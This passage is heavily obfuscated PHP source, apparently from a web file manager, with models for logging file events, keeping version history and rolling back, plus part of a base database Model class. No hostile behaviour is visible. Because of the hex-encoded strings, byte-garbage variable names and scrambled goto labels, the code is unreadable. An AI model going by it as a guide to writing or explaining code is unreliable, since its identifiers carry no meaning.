$…›Ü·á’) { $‚ÆŒ…ì = array($…›Ü·á’[$Àˆ½ã¶[1959]]); $ú¶©è“Ï = explode($Àˆ½ã¶[50], trim($…›Ü·á’[$Àˆ½ã¶[577]], $Àˆ½ã¶[50])); if ($ú¶©è“Ï[0] == $Àˆ½ã¶[238] && count($ú¶©è“Ï) > $¿šÊ ©) { $¥á¤“÷» = array_slice($ú¶©è“Ï, $¿šÊ ©); $‚ÆŒ…ì = array_merge($‚ÆŒ…ì, array_reverse($¥á¤“÷»)); } $‹ÙÙÔç = array_merge($‹ÙÙÔç, $‚ÆŒ…ì); } $Äá—µîˆ[$íÈãôªò] = array_unique($‹ÙÙÔç); return $Äá—µîˆ[$íÈãôªò]; } public function authTargetInfoMake($­¼à–†‹) { $“Ş÷÷·É =& $_SERVER[è¶³ÒßÑ]; $­÷÷ÄÓõ = array(); $°¾›¼è = array(); foreach ($­¼à–†‹ as $¶ïı¸–) { if ($¶ïı¸–[$“Ş÷÷·É[200]] == SourceModel::TYPE_USER) { $­÷÷ÄÓõ[] = intval($¶ïı¸–[$“Ş÷÷·É[562]]); } else { if ($¶ïı¸–[$“Ş÷÷·É[200]] == SourceModel::TYPE_GROUP) { $°¾›¼è[] = intval($¶ïı¸–[$“Ş÷÷·É[562]]); } } } if ($­÷÷ÄÓõ) { $­÷÷ÄÓõ = Model($“Ş÷÷·É[570])->userListInfo($­÷÷ÄÓõ); } if ($°¾›¼è) { $í¤Âé—Ÿ = array($“Ş÷÷·É[2051] => array($“Ş÷÷·É[485], $°¾›¼è)); $°¾›¼è = Model($“Ş÷÷·É[578])->field($“Ş÷÷·É[2180])->where($í¤Âé—Ÿ)->select(); $°¾›¼è = array_to_keyvalue($°¾›¼è, $“Ş÷÷·É[1959]); } return array($“Ş÷÷·É[2181] => $­÷÷ÄÓõ, $“Ş÷÷·É[2182] => $°¾›¼è); } public function authInfo($·€äş•œ) { $ÊÜ®ŠŒ€ =& $_SERVER[è¶³ÒßÑ]; if ($·€äş•œ[$ÊÜ®ŠŒ€[2067]]) { $ù’º§´ù = Model($ÊÜ®ŠŒ€[564])->listData($·€äş•œ[$ÊÜ®ŠŒ€[2067]]); if (!$ù’º§´ù) { return !1; $¬éÂ“”Ø = Model($ÊÜ®ŠŒ€[564])->listData(); $¢¹ÛÇ›‘ = array_filter_by_field($¬éÂ“”Ø, $ÊÜ®ŠŒ€[480], $ÊÜ®ŠŒ€[238]); return $¢¹ÛÇ›‘; } $ãıŞÃñà = array_field_key($ù’º§´ù, array($ÊÜ®ŠŒ€[468], $ÊÜ®ŠŒ€[32], $ÊÜ®ŠŒ€[480], $ÊÜ®ŠŒ€[1982], $ÊÜ®ŠŒ€[1983])); $ãıŞÃñà[$ÊÜ®ŠŒ€[2183]] = $·€äş•œ; return $ãıŞÃñà; } else { return array($ÊÜ®ŠŒ€[486] => 0, $ÊÜ®ŠŒ€[1965] => $·€äş•œ[$ÊÜ®ŠŒ€[2127]], $ÊÜ®ŠŒ€[487] => $ÊÜ®ŠŒ€[12], $ÊÜ®ŠŒ€[1982] => $ÊÜ®ŠŒ€[2184]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\162\x63\145\x5f\145\166\x65\x6e\164"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\x73\x65\162\x74", "\146\x75\x6e\143\164\151\x6f\x6e"), array("\x64\x65\x73\143", '', "\151\156\163\x65\162\164\x2c\x75\x70\x64\141\164\x65\x2c\x73\x65\154\145\143\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($èŠÌ‡ô, $©ç”ÌÑÉ, $¶Åº€û = '') { $ˆ·å™®Ï =& $_SERVER[è¶³ÒßÑ]; if (!$this->eventSave) { return; } $—“šÖ« = Model($ˆ·å™®Ï[1395])->sourceInfo($èŠÌ‡ô); if (!$—“šÖ«) { return !1; } if ($this->isDisableEvent($—“šÖ«, $©ç”ÌÑÉ)) { return; } if ($¶Åº€û && is_string($¶Åº€û)) { $¶Åº€û = array($ˆ·å™®Ï[1998] => $¶Åº€û); } $İëœæ = defined($ˆ·å™®Ï[2185]) ? USER_ID : 0; $Î“»Ÿ© = array($ˆ·å™®Ï[484] => $èŠÌ‡ô, $ˆ·å™®Ï[2186] => $—“šÖ«[$ˆ·å™®Ï[202]], $ˆ·å™®Ï[2187] => $—“šÖ«[$ˆ·å™®Ï[32]], $ˆ·å™®Ï[575] => !empty($—“šÖ«[$ˆ·å™®Ï[575]]) ? $—“šÖ«[$ˆ·å™®Ï[575]] : $ˆ·å™®Ï[12], $ˆ·å™®Ï[1752] => $İëœæ, $ˆ·å™®Ï[489] => $©ç”ÌÑÉ, $ˆ·å™®Ï[1754] => $¶Åº€û); $this->addSystemLog($©ç”ÌÑÉ, $Î“»Ÿ©); unset($Î“»Ÿ©[$ˆ·å™®Ï[2187]], $Î“»Ÿ©[$ˆ·å™®Ï[575]]); return $this->add($Î“»Ÿ©); } private function addSystemLog($ˆÊ¼ÏÆå, $¤Ë„¤î) { $—“‡Ï»Î =& $_SERVER[è¶³ÒßÑ]; if ($ˆÊ¼ÏÆå == $—“‡Ï»Î[2188]) { $ˆÊ¼ÏÆå = $¤Ë„¤î[$—“‡Ï»Î[519]][$—“‡Ï»Î[2189]]; } else { if (in_array($ˆÊ¼ÏÆå, array($—“‡Ï»Î[1939], $—“‡Ï»Î[2190]))) { $ˆÊ¼ÏÆå = $¤Ë„¤î[$—“‡Ï»Î[519]][$—“‡Ï»Î[181]]; } } $¯ïòäÑ¤ = array_merge($¤Ë„¤î, array($—“‡Ï»Î[2191] => $¤Ë„¤î[$—“‡Ï»Î[203]], $—“‡Ï»Î[2192] => $¤Ë„¤î[$—“‡Ï»Î[2192]])); Hook::trigger($—“‡Ï»Î[2193], $—“‡Ï»Î[2194] . $ˆÊ¼ÏÆå, $¤Ë„¤î); Model($—“‡Ï»Î[1903])->addLog($—“‡Ï»Î[2194] . $ˆÊ¼ÏÆå, $¯ïòäÑ¤); } private function isDisableEvent($©Î‚öÆ, $œåûîˆ„) { $¼¶Şßôƒ =& $_SERVER[è¶³ÒßÑ]; if ($©Î‚öÆ[$¼¶Şßôƒ[200]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($œåûîˆ„ == $¼¶Şßôƒ[1928]) { return !1; } return !0; } public function eventCreate($÷—û­ş, $Ğ¶ÁşÍ) { $û¸¥Ğ£â =& $_SERVER[è¶³ÒßÑ]; $şÄÔ£– = Model($û¸¥Ğ£â[1395])->sourceInfo($÷—û­ş); $ûõÒŞ¹à = array($û¸¥Ğ£â[2189] => $Ğ¶ÁşÍ, $û¸¥Ğ£â[32] => $şÄÔ£–[$û¸¥Ğ£â[32]]); return $this->addEvent($÷—û­ş, $û¸¥Ğ£â[2188], $ûõÒŞ¹à); } public function eventFileEdit($è’ ó½ú) { $×˜¦Ö‡ =& $_SERVER[è¶³ÒßÑ]; $îã¥Š…‘ = array($×˜¦Ö‡[2195] => $_SERVER[$×˜¦Ö‡[2196]], $×˜¦Ö‡[2197] => strtolower(ACTION)); if (isset($GLOBALS[$×˜¦Ö‡[7]][$×˜¦Ö‡[2198]])) { $îã¥Š…‘[$×˜¦Ö‡[2198]] = $×˜¦Ö‡[101]; } return $this->addEvent($è’ ó½ú, $×˜¦Ö‡[1929], $îã¥Š…‘); } public function eventRecycle($Ôáâø‹½, $€¥Ìæôñ) { return $this->addEvent($Ôáâø‹½, $_SERVER[è¶³ÒßÑ][2190], $€¥Ìæôñ); } private static $_removeLast = ''; public function eventRemove($ˆ°ŠÌ¸ï) { $¢¬’Šé‹ =& $_SERVER[è¶³ÒßÑ]; self::$_removeLast = $ˆ°ŠÌ¸ï; $Ã¯¦¤›Ø = Model($¢¬’Šé‹[1395])->sourceInfo($ˆ°ŠÌ¸ï); $ÑªçÑõ° = array_field_key($Ã¯¦¤›Ø, array($¢¬’Šé‹[203], $¢¬’Šé‹[534], $¢¬’Šé‹[498], $¢¬’Šé‹[577])); $ƒüçèßÖ = array($¢¬’Šé‹[181] => $Ã¯¦¤›Ø[$¢¬’Šé‹[32]], $¢¬’Šé‹[2197] => ACTION, $¢¬’Šé‹[2199] => $ÑªçÑõ°); return $this->addEvent($Ã¯¦¤›Ø[$¢¬’Šé‹[202]], $¢¬’Šé‹[1928], $ƒüçèßÖ); } public function eventShare($úÆ°‡ÅÒ, $€•çÃ¤›) { return $this->addEvent($úÆ°‡ÅÒ, $_SERVER[è¶³ÒßÑ][1939], $€•çÃ¤›); } public function eventMove($Ô…ÏÖ‡€, $ü”Ë·ºŸ, $Â²Ë˜Ï¥) { $Ğ­ƒŞ®ô =& $_SERVER[è¶³ÒßÑ]; if (self::$_removeLast == $Ô…ÏÖ‡€) { return; } $º¼˜×© = Model($Ğ­ƒŞ®ô[1395]); $™Ö¿õšÛ = $º¼˜×©->sourceInfo($Ô…ÏÖ‡€); $†ˆşÇÉå = $º¼˜×©->sourceInfo($ü”Ë·ºŸ); $’† ¸¼É = $º¼˜×©->sourceInfo($Â²Ë˜Ï¥); $Åºø®£Ê = array($Ğ­ƒŞ®ô[1216] => $ü”Ë·ºŸ, $Ğ­ƒŞ®ô[2200] => $†ˆşÇÉå[$Ğ­ƒŞ®ô[32]], $Ğ­ƒŞ®ô[2176] => !empty($†ˆşÇÉå[$Ğ­ƒŞ®ô[575]]) ? $†ˆşÇÉå[$Ğ­ƒŞ®ô[575]] : $Ğ­ƒŞ®ô[12], $Ğ­ƒŞ®ô[1217] => $Â²Ë˜Ï¥, $Ğ­ƒŞ®ô[2201] => $’† ¸¼É[$Ğ­ƒŞ®ô[32]], $Ğ­ƒŞ®ô[2202] => !empty($’† ¸¼É[$Ğ­ƒŞ®ô[575]]) ? $’† ¸¼É[$Ğ­ƒŞ®ô[575]] : $Ğ­ƒŞ®ô[12]); $this->addEvent($Ô…ÏÖ‡€, $Ğ­ƒŞ®ô[613], $Åºø®£Ê); $™Ö¿õšÛ = $º¼˜×©->sourceInfo($Ô…ÏÖ‡€); $Åºø®£Ê = array($Ğ­ƒŞ®ô[203] => $™Ö¿õšÛ[$Ğ­ƒŞ®ô[203]], $Ğ­ƒŞ®ô[32] => $™Ö¿õšÛ[$Ğ­ƒŞ®ô[32]]); $this->addEvent($ü”Ë·ºŸ, $Ğ­ƒŞ®ô[2203], $Åºø®£Ê); } public function eventCopy($¾ƒ¯Ä«Â) { $this->eventCreate($¾ƒ¯Ä«Â, $_SERVER[è¶³ÒßÑ][611]); } public function eventRename($‰·­—Îø, $óÌ¢š×, $’äà·ÚÈ) { $ŸÜÛ‚‘å =& $_SERVER[è¶³ÒßÑ]; $¡ÂÔÚİî = array($ŸÜÛ‚‘å[1216] => $óÌ¢š×, $ŸÜÛ‚‘å[1217] => $’äà·ÚÈ); return $this->addEvent($‰·­—Îø, $ŸÜÛ‚‘å[1409], $¡ÂÔÚİî); } public function eventAddComment($åç©ÚÔê, $ç¦…Ù¥ã) { return $this->addEvent($åç©ÚÔê, $_SERVER[è¶³ÒßÑ][2204], $ç¦…Ù¥ã); } public function eventAddDesc($ßÎ»î€Ù, $ÃŸÜÑË˜) { return $this->addEvent($ßÎ»î€Ù, $_SERVER[è¶³ÒßÑ][2205], $ÃŸÜÑË˜); } public function listBySource($ê§¡Ü) { $¥ç”ã©­ =& $_SERVER[è¶³ÒßÑ]; $ô˜¥×İ… = Model($¥ç”ã©­[1395])->sourceInfo($ê§¡Ü); $İµ”­½Ä = array($¥ç”ã©­[484] => $ê§¡Ü); if ($ô˜¥×İ…[$¥ç”ã©­[478]] == $¥ç”ã©­[101]) { $¬½°„ì = Model($¥ç”ã©­[1395])->listSearchChildren($ê§¡Ü, 20000); $¬½°„ì[] = $ê§¡Ü . $¥ç”ã©­[447]; $İµ”­½Ä = array($¥ç”ã©­[203] => array($¥ç”ã©­[7], $¬½°„ì)); } $¾å“×Ÿ = $this->where($İµ”­½Ä)->order($¥ç”ã©­[2206])->selectPage(); if ($¾å“×Ÿ[$¥ç”ã©­[435]][$¥ç”ã©­[436]] == 0) { $¾å“×Ÿ[$¥ç”ã©­[435]][$¥ç”ã©­[436]] = 1; $¾å“×Ÿ[$¥ç”ã©­[438]] = array(array($¥ç”ã©­[484] => $ê§¡Ü, $¥ç”ã©­[2186] => $ô˜¥×İ…[$¥ç”ã©­[202]], $¥ç”ã©­[1752] => $ô˜¥×İ…[$¥ç”ã©­[520]], $¥ç”ã©­[489] => $¥ç”ã©­[2207], $¥ç”ã©­[490] => $ô˜¥×İ…[$¥ç”ã©­[241]], $¥ç”ã©­[1754] => $¥ç”ã©­[12])); } return $this->eventListParse($¾å“×Ÿ, $ê§¡Ü); } private function eventListParse($“¢º…˜, $Ìšù²) { $²‚£‹Ú€ =& $_SERVER[è¶³ÒßÑ]; $­¿º”¦¿ = $“¢º…˜[$²‚£‹Ú€[438]]; $‹¼¾¶Å½ = array_to_keyvalue($­¿º”¦¿, $²‚£‹Ú€[12], $²‚£‹Ú€[203]); $î’ì¦Öä = array_to_keyvalue($­¿º”¦¿, $²‚£‹Ú€[12], $²‚£‹Ú€[2192]); foreach ($­¿º”¦¿ as $ôı…È™ñ) { $œÚ‹–·Ó = $ôı…È™ñ[$²‚£‹Ú€[519]]; if ($ôı…È™ñ[$²‚£‹Ú€[33]] == $²‚£‹Ú€[613] && isset($œÚ‹–·Ó[$²‚£‹Ú€[1216]])) { $‹¼¾¶Å½[] = $œÚ‹–·Ó[$²‚£‹Ú€[1216]] . $²‚£‹Ú€[12]; $‹¼¾¶Å½[] = $œÚ‹–·Ó[$²‚£‹Ú€[1217]] . $²‚£‹Ú€[12]; } if ($ôı…È™ñ[$²‚£‹Ú€[33]] == $²‚£‹Ú€[2203] && isset($œÚ‹–·Ó[$²‚£‹Ú€[203]])) { $‹¼¾¶Å½[] = $œÚ‹–·Ó[$²‚£‹Ú€[203]] . $²‚£‹Ú€[12]; } } $‹¼¾¶Å½ = array_merge($‹¼¾¶Å½, $î’ì¦Öä, array($Ìšù² . $²‚£‹Ú€[12])); $‹¼¾¶Å½ = array_unique($‹¼¾¶Å½); $µµÙ¶š = array_unique(array_to_keyvalue($­¿º”¦¿, $²‚£‹Ú€[12], $²‚£‹Ú€[1761])); $©Í½Ù”å = Model($²‚£‹Ú€[591])->userListInfo($µµÙ¶š); $Û™£›İ¹ = Model($²‚£‹Ú€[878])->sourceListInfo($‹¼¾¶Å½, !0); foreach ($­¿º”¦¿ as &$ôı…È™ñ) { if ($ôı…È™ñ[$²‚£‹Ú€[33]] == $²‚£‹Ú€[613] && isset($ôı…È™ñ[$²‚£‹Ú€[519]][$²‚£‹Ú€[1216]])) { $ôı…È™ñ[$²‚£‹Ú€[519]][$²‚£‹Ú€[1216]] = $Û™£›İ¹[$ôı…È™ñ[$²‚£‹Ú€[519]][$²‚£‹Ú€[1216]]]; $ôı…È™ñ[$²‚£‹Ú€[519]][$²‚£‹Ú€[1217]] = $Û™£›İ¹[$ôı…È™ñ[$²‚£‹Ú€[519]][$²‚£‹Ú€[1217]]]; } if ($ôı…È™ñ[$²‚£‹Ú€[33]] == $²‚£‹Ú€[2203] && isset($ôı…È™ñ[$²‚£‹Ú€[519]][$²‚£‹Ú€[203]])) { $ôı…È™ñ[$²‚£‹Ú€[519]][$²‚£‹Ú€[203]] = $Û™£›İ¹[$ôı…È™ñ[$²‚£‹Ú€[519]][$²‚£‹Ú€[203]]]; } $ôı…È™ñ[$²‚£‹Ú€[100]] = $Û™£›İ¹[$ôı…È™ñ[$²‚£‹Ú€[203]]]; $ôı…È™ñ[$²‚£‹Ú€[2208]] = $Û™£›İ¹[$ôı…È™ñ[$²‚£‹Ú€[2192]]]; if ($ôı…È™ñ[$²‚£‹Ú€[33]] == $²‚£‹Ú€[1928]) { $ôı…È™ñ[$²‚£‹Ú€[2208]] = $ôı…È™ñ[$²‚£‹Ú€[100]]; $ôı…È™ñ[$²‚£‹Ú€[2192]] = $ôı…È™ñ[$²‚£‹Ú€[2208]][$²‚£‹Ú€[203]]; $ôı…È™ñ[$²‚£‹Ú€[100]] = !1; $ôı…È™ñ[$²‚£‹Ú€[203]] = $²‚£‹Ú€[12]; } $ôı…È™ñ[$²‚£‹Ú€[2135]] = $©Í½Ù”å[$ôı…È™ñ[$²‚£‹Ú€[1761]]]; } unset($ôı…È™ñ); $“¢º…˜[$²‚£‹Ú€[438]] = $­¿º”¦¿; return $“¢º…˜; } public function removeBySource($ò´ğŞ¿î) { $‰·§îßÏ = array($_SERVER[è¶³ÒßÑ][484] => $ò´ğŞ¿î); $this->where($‰·§îßÏ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\x63\x65\137\x68\x69\163\x74\157\162\171"; public function historyCount($€¹¡Äßß) { $ ˜Ú÷ =& $_SERVER[è¶³ÒßÑ]; if (!$€¹¡Äßß) { return array(); } if (is_string($€¹¡Äßß) || is_int($€¹¡Äßß)) { $€¹¡Äßß = array($€¹¡Äßß); } $øÑÒÇ é = array($ ˜Ú÷[203], $ ˜Ú÷[1992] => $ ˜Ú÷[558]); $˜²Çƒ·Ñ = array($ ˜Ú÷[203] => array($ ˜Ú÷[7], $€¹¡Äßß)); $»¶µÈÈ¢ = $this->field($øÑÒÇ é)->where($˜²Çƒ·Ñ)->group($ ˜Ú÷[203])->select(); return array_to_keyvalue($»¶µÈÈ¢, $ ˜Ú÷[203], $ ˜Ú÷[558]); } public function addHistory($èú‰³¢, $Œ˜¥ÌşÃ = '') { $§¿º— =& $_SERVER[è¶³ÒßÑ]; $…ŸôÊˆÔ = array($§¿º—[484] => $èú‰³¢[$§¿º—[203]], $§¿º—[1752] => isset($èú‰³¢[$§¿º—[522]]) ? $èú‰³¢[$§¿º—[522]] : $èú‰³¢[$§¿º—[520]], $§¿º—[535] => $èú‰³¢[$§¿º—[534]], $§¿º—[610] => $èú‰³¢[$§¿º—[89]], $§¿º—[2209] => $Œ˜¥ÌşÃ); if ($GLOBALS[$§¿º—[6]][$§¿º—[102]][$§¿º—[1277]] >= 1) { $this->historyAutoClear($…ŸôÊˆÔ[$§¿º—[203]]); $this->add($…ŸôÊˆÔ); } Hook::trigger($§¿º—[2210], $…ŸôÊˆÔ); Model($§¿º—[2211])->eventFileEdit($èú‰³¢[$§¿º—[203]]); } private function historyAutoClear($Ò¢‘øÓ) { $©ñ„Å =& $_SERVER[è¶³ÒßÑ]; $ñ¦à’¥Ã = Model($©ñ„Å[824])->get($©ñ„Å[1299]); $·¢à’…Ü = intval($GLOBALS[$©ñ„Å[6]][$©ñ„Å[102]][$©ñ„Å[1277]]); $Ì¨èêŸ = $ñ¦à’¥Ã == $©ñ„Å[1300] ? min(5, $·¢à’…Ü) : $·¢à’…Ü; $Ì¨èêŸ = $Ì¨èêŸ <= 0 ? 0 : $Ì¨èêŸ - 1; if ($Ì¨èêŸ >= 499) { return; } $ïª¿ââ‘ = array($©ñ„Å[484] => $Ò¢‘øÓ); $‰Ç‚ÜóÂ = $this->field($©ñ„Å[2212])->where($ïª¿ââ‘)->order($©ñ„Å[2206])->select(); if (!$‰Ç‚ÜóÂ || $Ì¨èêŸ >= count($‰Ç‚ÜóÂ)) { return; } $°ÖÁ¶¿ = array_to_keyvalue($‰Ç‚ÜóÂ, $©ñ„Å[12], $©ñ„Å[468]); $°ÖÁ¶¿ = array_slice($°ÖÁ¶¿, $Ì¨èêŸ); $öØë€Î— = array_to_keyvalue($‰Ç‚ÜóÂ, $©ñ„Å[12], $©ñ„Å[534]); $öØë€Î— = array_slice($öØë€Î—, $Ì¨èêŸ); if (!$°ÖÁ¶¿ || !$öØë€Î—) { return; } $ïª¿ââ‘ = array($©ñ„Å[486] => array($©ñ„Å[7], $°ÖÁ¶¿)); $this->where($ïª¿ââ‘)->delete(); Model($©ñ„Å[537])->remove($öØë€Î—); } public function listData($èŸõä–) { $–ûƒ“´ =& $_SERVER[è¶³ÒßÑ]; $åÛ‘óü“ = array($–ûƒ“´[484] => $èŸõä–); $õ×øá = $–ûƒ“´[2213]; $²î¯ÖÚĞ = $this->field($õ×øá)->where($åÛ‘óü“)->order($–ûƒ“´[2206])->selectPage(); $this->_listAppendUser($²î¯ÖÚĞ[$–ûƒ“´[438]]); $åã”ô¬Ö = Model($–ûƒ“´[824])->get($–ûƒ“´[1299]); $©¡Ø­øÂ = 5; if ($åã”ô¬Ö == $–ûƒ“´[1300]) { $²î¯ÖÚĞ[$–ûƒ“´[438]] = array_slice($²î¯ÖÚĞ[$–ûƒ“´[438]], 0, $©¡Ø­øÂ); $²î¯ÖÚĞ[$–ûƒ“´[435]] = array($–ûƒ“´[2214] => 1, $–ûƒ“´[2215] => 20, $–ûƒ“´[2216] => 1, $–ûƒ“´[2217] => count($²î¯ÖÚĞ[$–ûƒ“´[438]])); } return $²î¯ÖÚĞ; } protected function _listAppendUser(&$‰Ç´©ñÂ) { $¶ÜÜÄÙÄ =& $_SERVER[è¶³ÒßÑ]; $¶¤Å³£„ = array_to_keyvalue($‰Ç´©ñÂ, $¶ÜÜÄÙÄ[12], $¶ÜÜÄÙÄ[1761]); $‹‡’”­á = Model($¶ÜÜÄÙÄ[591])->userListInfo($¶¤Å³£„); foreach ($‰Ç´©ñÂ as &$â£š©³) { $ˆ…ßŞôŠ = $â£š©³[$¶ÜÜÄÙÄ[1761]]; $â£š©³[$¶ÜÜÄÙÄ[520]] = $‹‡’”­á[$ˆ…ßŞôŠ] ? $‹‡’”­á[$ˆ…ßŞôŠ] : !1; } unset($â£š©³); } public function fileInfo($ÏÓŸÌè) { $ÂÎÉçö =& $_SERVER[è¶³ÒßÑ]; $›ìŞşèÆ = $this->tablePrefix; $®õ–£Ÿ¿ = "{$›ìŞşèÆ}\x69\x6f\137\x66\x69\x6c\145\40\x66\x69\x6c\x65\163\40\x6f\x6e\40\146\151\154\145\x73\56\146\151\x6c\145\x49\104\x20\75\40\x68\x69\x73\x74\157\x72\171\56\x66\151\154\145\x49\x44"; return $this->alias($ÂÎÉçö[2218])->where(array($ÂÎÉçö[486] => $ÏÓŸÌè))->join($®õ–£Ÿ¿, $ÂÎÉçö[2219])->find(); } public function removeItem($ôô†óß¹) { $ú‹Ş­£ =& $_SERVER[è¶³ÒßÑ]; $¥å·°›µ = array($ú‹Ş­£[486] => $ôô†óß¹); $‚ÄÂ™Çˆ = $this->where($¥å·°›µ)->find(); if ($‚ÄÂ™Çˆ) { $¿‡–ó‰— = $this->where($¥å·°›µ)->delete(); Model($ú‹Ş­£[537])->remove($‚ÄÂ™Çˆ[$ú‹Ş­£[534]]); return $¿‡–ó‰—; } return !1; } public function removeBySource($¸ä ¬™Ÿ) { $á—¿õÕ© =& $_SERVER[è¶³ÒßÑ]; if (!$¸ä ¬™Ÿ) { return !1; } if (!is_array($¸ä ¬™Ÿ)) { $¸ä ¬™Ÿ = array($¸ä ¬™Ÿ); } $šÊÍâı¦ = array($á—¿õÕ©[484] => array($á—¿õÕ©[7], $¸ä ¬™Ÿ)); $×É«Ÿ«Æ = $this->field($á—¿õÕ©[535])->where($šÊÍâı¦)->select(); if ($×É«Ÿ«Æ) { $this->where($šÊÍâı¦)->delete(); $İ™Á–“à = array_to_keyvalue($×É«Ÿ«Æ, $á—¿õÕ©[12], $á—¿õÕ©[534]); Model($á—¿õÕ©[537])->remove($İ™Á–“à); } return !0; } public function setDetail($¸­”÷¬í, $È›½¼Ñ™) { $‹ªÈ¬‰” =& $_SERVER[è¶³ÒßÑ]; return $this->where(array($‹ªÈ¬‰”[486] => $¸­”÷¬í))->save(array($‹ªÈ¬‰”[2209] => $È›½¼Ñ™)); } public function rollbackToItem($¥Å¬ŠœÀ, $ûÇüĞÔ§) { $·‹¾’¡ =& $_SERVER[è¶³ÒßÑ]; $åç¬Ö¶ = Model($·‹¾’¡[878])->sourceInfo($¥Å¬ŠœÀ); $this->addHistory($åç¬Ö¶, LNG($·‹¾’¡[2220])); $Œ‰ãÓÃ¥ = $this->find($ûÇüĞÔ§); $¨·êÃ´ = array($·‹¾’¡[534] => $Œ‰ãÓÃ¥[$·‹¾’¡[534]], $·‹¾’¡[89] => $Œ‰ãÓÃ¥[$·‹¾’¡[89]], $·‹¾’¡[98] => time(), $·‹¾’¡[522] => USER_ID); Model($·‹¾’¡[878])->where(array($·‹¾’¡[203] => $¥Å¬ŠœÀ))->save($¨·êÃ´); return $this->where(array($·‹¾’¡[486] => $ûÇüĞÔ§))->delete(); } public function clearSame($ß‹‰Ìè) { $ãåÄŸ«Ï =& $_SERVER[è¶³ÒßÑ]; $•ëûúşÛ = $this->listData($ß‹‰Ìè); $Šğø”Øø = array_to_keyvalue_group($•ëûúşÛ, $ãåÄŸ«Ï[534]); $¡Ëˆö = array(); $ÏºÚå¶“ = array(); foreach ($Šğø”Øø as $çÊÁ) { if (!$çÊÁ || count($çÊÁ) <= 1) { continue; } foreach ($çÊÁ as $ıĞï¶”Õ) { $¡Ëˆö[] = $ıĞï¶”Õ[$ãåÄŸ«Ï[534]]; $ÏºÚå¶“[] = $ıĞï¶”Õ[$ãåÄŸ«Ï[468]]; } } if (!$ÏºÚå¶“) { return; } $this->where(array($ãåÄŸ«Ï[468] => array($ãåÄŸ«Ï[7], $ÏºÚå¶“)))->delete(); Model($ãåÄŸ«Ï[537])->remove($¡Ëˆö); } public function userSpace() { $ÎöÄâòÄ =& $_SERVER[è¶³ÒßÑ]; $¬áÛ•ì™ = $this->tablePrefix; $°äíü¯« = array($ÎöÄâòÄ[1752] => USER_ID); $¨”®¨íô = "{$¬áÛ•ì™}\x69\157\137\146\151\154\145\40\x66\x69\154\x65\163\40\x6f\x6e\x20\146\151\154\145\163\56\146\151\154\145\111\104\x20\75\x20\x68\x69\163\x74\157\x72\x79\x2e\x66\151\154\x65\111\104"; return $this->alias($ÎöÄâòÄ[2218])->where($°äíü¯«)->join($¨”®¨íô, $ÎöÄâòÄ[2219])->sum($ÎöÄâòÄ[89]); } } goto Aóè÷İ–ñ¯; AŒàôŠ…êÂ: define($_SERVER[è¶³ÒßÑ][308], 1); define($_SERVER[è¶³ÒßÑ][309], 2); define($_SERVER[è¶³ÒßÑ][310], 3); goto dšø—Ì…‹¡; eÇ¯·“‘Â: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\x65", "\157\x72\x64\145\162", "\141\x6c\151\x61\x73", "\150\141\166\x69\x6e\147", "\x67\x72\x6f\x75\160", "\154\x6f\x63\x6b", "\144\151\163\164\x69\x6e\x63\164", "\x61\165\164\x6f", "\x66\x69\x6c\164\x65\162", "\166\x61\154\151\x64\x61\x74\145", "\x72\x65\163\165\154\164", "\x62\151\x6e\144", "\164\157\153\x65\156"); public function __construct($Ïø–›æ = '', $Óî‚”ìÑ = '', $ªÏó»Ğí = '') { $¥ÔÌï§„ =& $_SERVER[è¶³ÒßÑ]; $this->_initialize(); if (!empty($Ïø–›æ)) { if (strpos($Ïø–›æ, $¥ÔÌï§„[10])) { list($this->dbName, $this->name) = explode($¥ÔÌï§„[10], $Ïø–›æ); } else { $this->name = $Ïø–›æ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Óî‚”ìÑ)) { $this->tablePrefix = $¥ÔÌï§„[12]; } elseif ($¥ÔÌï§„[12] != $Óî‚”ìÑ) { $this->tablePrefix = $Óî‚”ìÑ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¥ÔÌï§„[314]); } $this->db(0, empty($this->connection) ? $ªÏó»Ğí : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $İ‰®© =& $_SERVER[è¶³ÒßÑ]; if (empty($this->fields)) { if (think_config($İ‰®©[315])) { $©€„ñ²­ = $this->dbName ? $this->dbName : think_config($İ‰®©[316]); $ñİİô‘‹ = think_var_cache($İ‰®©[317] . strtolower(get_path_this($©€„ñ²­) . $İ‰®©[10] . $this->name)); if ($ñİİô‘‹) { $óÎ¥Ó‚¬ = think_config($İ‰®©[318]); if (empty($óÎ¥Ó‚¬) || $ñİİô‘‹[$İ‰®©[319]] == $óÎ¥Ó‚¬) { $this->fields = $ñİİô‘‹; return; } } } $this->flush(); } } public function flush() { $ßµ¬ò£ä =& $_SERVER[è¶³ÒßÑ]; $this->db->setModel($this->name); $á–¬ûöµ = $this->db->getFields($this->getTableName()); if (!$á–¬ûöµ) { return !1; } $this->fields = array_keys($á–¬ûöµ); $this->fields[$ßµ¬ò£ä[320]] = !1; foreach ($á–¬ûöµ as $„çÌ·á => $Í¸Ôíãå) { $šäôˆû»[$„çÌ·á] = $Í¸Ôíãå[$ßµ¬ò£ä[33]]; if ($Í¸Ôíãå[$ßµ¬ò£ä[39]]) { $this->fields[$ßµ¬ò£ä[321]] = $„çÌ·á; if ($Í¸Ôíãå[$ßµ¬ò£ä[42]]) { $this->fields[$ßµ¬ò£ä[320]] = !0; } } } $this->fields[$ßµ¬ò£ä[322]] = $šäôˆû»; if (think_config($ßµ¬ò£ä[318])) { $this->fields[$ßµ¬ò£ä[319]] = think_config($ßµ¬ò£ä[318]); } if (think_config($ßµ¬ò£ä[315])) { $°º±Î™½ = $this->dbName ? $this->dbName : 